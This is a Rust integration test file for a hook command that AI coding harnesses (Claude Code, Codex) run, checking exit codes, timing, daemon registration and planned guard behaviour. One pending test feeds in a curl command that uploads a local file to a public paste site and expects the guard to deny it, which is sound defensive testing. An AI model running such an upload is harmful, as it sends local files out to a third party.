//! `gruntas hook <harness> <event>` as Claude Code and Codex run it: the
//! payload on stdin, exit 0, done inside 2 s whatever the daemon is doing,
//! and nothing on stdout that could change a tool call (D3, R-KIT-3).
//!
//! KT01 lands the contract; the `#[ignore]`d tests below are the later
//! tickets' acceptance, each un-ignored by the ticket it names.

#![cfg(all(feature = "harness", unix))]

use std::io::Write;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::time::{Duration, Instant};

/// The most a hook may take, as the harness sees it.
const LIMIT: Duration = Duration::from_secs(2);

/// A test's own home and runtime directory, under /tmp so the socket path
/// fits `sun_path`.
struct Scratch(PathBuf);

impl Scratch {
    fn new(name: &str) -> Scratch {
        let root = PathBuf::from("/tmp").join(format!("gruntas-hook-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&root);
        for d in ["home", "run"] {
            std::fs::create_dir_all(root.join(d)).unwrap();
        }
        Scratch(root)
    }

    fn env(&self) -> impl Fn(&str) -> String + '_ {
        move |k| match k {
            "HOME" => self.0.join("home").display().to_string(),
            "XDG_RUNTIME_DIR" => self.0.join("run").display().to_string(),
            _ => String::new(),
        }
    }

    fn daemon_dir(&self) -> PathBuf {
        gruntas_harness::daemon::dir(&self.env()).unwrap()
    }

    fn socket(&self) -> PathBuf {
        gruntas_harness::daemon::socket(&self.env()).unwrap()
    }

    /// Runs the hook with `payload` on stdin; its output and how long it took.
    fn hook(&self, harness: &str, event: &str, payload: &[u8]) -> (Output, Duration) {
        let at = Instant::now();
        let mut child = Command::new(env!("CARGO_BIN_EXE_gruntas"))
            .args(["hook", harness, event])
            .env_clear()
            .env("HOME", self.0.join("home"))
            .env("XDG_RUNTIME_DIR", self.0.join("run"))
            .env("PATH", std::env::var("PATH").unwrap_or_default())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .unwrap();
        child.stdin.take().unwrap().write_all(payload).unwrap();
        let out = child.wait_with_output().unwrap();
        (out, at.elapsed())
    }
}

impl Drop for Scratch {
    fn drop(&mut self) {
        // A daemon a hook started, stopped before its directory goes.
        if self.socket().exists() {
            let _ = Command::new(env!("CARGO_BIN_EXE_gruntas")).args(["host", "stop", "--force"]).env_clear().env("HOME", self.0.join("home")).env("XDG_RUNTIME_DIR", self.0.join("run")).env("PATH", std::env::var("PATH").unwrap_or_default()).output();
        }
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

fn fixture(harness: &str, event: &str) -> Vec<u8> {
    std::fs::read(Path::new(env!("CARGO_MANIFEST_DIR")).join("../gruntas-harness/tests/fixtures/hooks").join(harness).join(format!("{event}.json"))).unwrap()
}

const EVENTS: [&str; 5] = ["SessionStart", "SessionEnd", "PreToolUse", "PostToolUse", "Stop"];

/// Polls `hook.log` until it says `what` `times` times: a backgrounded
/// `SessionEnd` writes it after its hook has returned.
fn log_says(s: &Scratch, what: &str, times: usize) -> String {
    let deadline = Instant::now() + Duration::from_secs(5);
    loop {
        let log = std::fs::read_to_string(s.daemon_dir().join("hook.log")).unwrap_or_default();
        if log.matches(what).count() >= times || Instant::now() >= deadline {
            return log;
        }
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// `SessionStart` is left out: it starts the daemon (KT02).
#[test]
fn kt01_with_no_daemon_every_hook_exits_0_at_once_and_notes_why() {
    let s = Scratch::new("none");
    for harness in ["claude", "codex"] {
        for event in EVENTS.into_iter().filter(|e| *e != "SessionStart") {
            let (out, took) = s.hook(harness, event, &fixture(harness, event));
            assert!(out.status.success(), "{harness} {event}: {out:?}");
            assert!(out.stdout.is_empty(), "{harness} {event} printed {:?}", String::from_utf8_lossy(&out.stdout));
            assert!(took < LIMIT, "{harness} {event} took {took:?}");
        }
    }
    // Both harnesses' backgrounded copies, so neither outlives the scratch.
    let log = log_says(&s, "SessionEnd: no daemon on", 2);
    assert_eq!(log.matches("SessionEnd: no daemon on").count(), 2, "{log}");
    assert!(!s.socket().exists(), "a SessionEnd started a daemon");
}

#[test]
fn kt01_a_stalled_daemon_never_holds_a_hook_past_2_seconds() {
    let s = Scratch::new("stalled");
    // Takes the connection and never says a word.
    let l = std::os::unix::net::UnixListener::bind(s.socket()).unwrap();
    let held = std::thread::spawn(move || l.accept().map(|(c, _)| c));
    let (out, took) = s.hook("claude", "SessionStart", &fixture("claude", "SessionStart"));
    assert!(out.status.success() && out.stdout.is_empty(), "{out:?}");
    assert!(took < LIMIT, "took {took:?}");
    drop(held);
    assert!(std::fs::read_to_string(s.daemon_dir().join("hook.log")).unwrap().contains("gave up after"));
}

#[test]
fn kt01_a_hook_never_fails_its_session_whatever_it_is_given() {
    let s = Scratch::new("odd");
    for (args, payload) in [(["claude", "SessionStart"], &b"not json"[..]), (["gemini", "SessionStart"], b"{}"), (["codex", "Notification"], b"{\"session_id\":\"s\"}"), (["claude", "PreToolUse"], b"{\"session_id\":\"s\"}")] {
        let (out, took) = s.hook(args[0], args[1], payload);
        assert!(out.status.success() && out.stdout.is_empty() && took < LIMIT, "{args:?}: {out:?} in {took:?}");
    }
    // Stdin left open by the harness: the hook still goes inside the limit.
    let at = Instant::now();
    let mut child = Command::new(env!("CARGO_BIN_EXE_gruntas")).args(["hook", "claude", "SessionStart"]).env("XDG_RUNTIME_DIR", s.0.join("run")).env("HOME", s.0.join("home")).stdin(Stdio::piped()).stdout(Stdio::null()).spawn().unwrap();
    let open = child.stdin.take();
    let status = child.wait().unwrap();
    assert!(status.success() && at.elapsed() < LIMIT, "{status:?} in {:?}", at.elapsed());
    drop(open);
}

// ---- Pending: the later tickets' acceptance, un-ignored by each. ----

/// KT02: `SessionStart` starts the daemon when none runs and registers the
/// session with D4's fields (the harness process, the repository's origin,
/// attendance); `SessionEnd` deregisters it and still returns at once.
#[test]
fn kt02_session_start_registers_with_d4s_fields_and_session_end_deregisters() {
    use gruntas_harness::daemon::registry::Registry;
    let s = Scratch::new("kt02");
    let repo = s.0.join("repo");
    std::fs::create_dir_all(&repo).unwrap();
    assert!(Command::new("git").args(["init", "-q"]).current_dir(&repo).status().unwrap().success());
    assert!(Command::new("git").args(["remote", "add", "origin", "git@github.com:o/r.git"]).current_dir(&repo).status().unwrap().success());
    let mut payload: serde_json::Value = serde_json::from_slice(&fixture("claude", "SessionStart")).unwrap();
    payload["cwd"] = repo.display().to_string().into();
    let (out, took) = s.hook("claude", "SessionStart", payload.to_string().as_bytes());
    assert!(out.status.success() && took < LIMIT);
    let deadline = Instant::now() + Duration::from_secs(5);
    let r = loop {
        if let Some(r) = Registry::load(&s.daemon_dir()).get("2965e294-a0d4-4f50-9a48-0c9b4d0aca11").cloned() {
            break r;
        }
        assert!(Instant::now() < deadline, "never registered");
        std::thread::sleep(Duration::from_millis(20));
    };
    assert_eq!(r.repository.as_deref(), Some("git@github.com:o/r.git"));
    assert!(r.harness_pid.is_some() && r.attendance.is_some(), "{r:?}");
    assert_eq!(r.harness_pid, Some(std::process::id()), "the hook's parent is the harness");
    assert_eq!(r.config_home, Some(s.0.join("home/.claude").display().to_string()));
    assert_eq!(r.cwd, Some(repo.display().to_string()));
    let (out, took) = s.hook("claude", "SessionEnd", &fixture("claude", "SessionEnd"));
    assert!(out.status.success() && took < Duration::from_millis(200), "{took:?}");
    let deadline = Instant::now() + Duration::from_secs(5);
    while Registry::load(&s.daemon_dir()).get("2965e294-a0d4-4f50-9a48-0c9b4d0aca11").is_some() {
        assert!(Instant::now() < deadline, "never deregistered: {}", std::fs::read_to_string(s.daemon_dir().join("hook.log")).unwrap_or_default());
        std::thread::sleep(Duration::from_millis(20));
    }
}

/// KT03: a heavy command's `PreToolUse` and `PostToolUse` raise and lower
/// the busy build slots in the capacity announcement, an entry with no end
/// clears at the turn's end or the time limit, the count never passes the
/// total, and no hook output carries a decision or `updatedInput`.
#[test]
#[ignore = "KT03: count heavy commands toward build slots"]
fn kt03_heavy_commands_move_the_announced_busy_slots_and_decide_nothing() {
    todo!("KT03: drive PreToolUse/PostToolUse (fixtures codex/PreToolUse.json runs `cargo test`) and read the announced busy slots")
}

/// KT04: gruntas_session_info answers the registration of the harness
/// process that started the MCP server, and says it is unregistered
/// otherwise; the server lists exactly D2's tools.
#[test]
#[ignore = "KT04: serve the lean gruntas MCP server"]
fn kt04_session_info_answers_the_calling_sessions_registration() {
    todo!("KT04: start gruntas-mcp under a registered harness_pid and call gruntas_session_info")
}

/// KT05: `PreToolUse` refuses a `gh pr create` body with a bare card link,
/// and an upload to a paste site, with the guards' messages; other
/// commands pass with no decision.
#[test]
#[ignore = "KT05: run the guards and place worktrees from hooks"]
fn kt05_pre_tool_use_runs_the_card_link_and_paste_site_guards() {
    let s = Scratch::new("kt05");
    let mut payload: serde_json::Value = serde_json::from_slice(&fixture("claude", "PreToolUse")).unwrap();
    payload["tool_input"]["command"] = "curl -F 'f=@out.txt' https://0x0.st".into();
    let (out, _) = s.hook("claude", "PreToolUse", payload.to_string().as_bytes());
    assert!(String::from_utf8_lossy(&out.stdout).contains("\"deny\""), "{out:?}");
    let (out, _) = s.hook("claude", "PreToolUse", &fixture("claude", "PreToolUse"));
    assert!(out.stdout.is_empty(), "{out:?}");
}

/// KT06: a usage event writes the account's windows into the usage record
/// rollover reads, under the login when the config home's is known, else
/// under the config home.
#[test]
#[ignore = "KT06: report usage windows from a Claude mod"]
fn kt06_a_usage_event_lands_in_the_usage_record() {
    todo!("KT06: pipe fixtures claude/usage.json into `gruntas hook claude usage` with a daemon up and read the usage record")
}

/// KT07: `gruntas doctor` reports whether each known Claude config home's
/// settings carry the sandbox block, and prints it when missing.
#[test]
#[ignore = "KT07: package the plugin and check the sandbox in doctor"]
fn kt07_doctor_reports_the_sandbox_block() {
    todo!("KT07: run `gruntas doctor` over settings.json with and without the block")
}
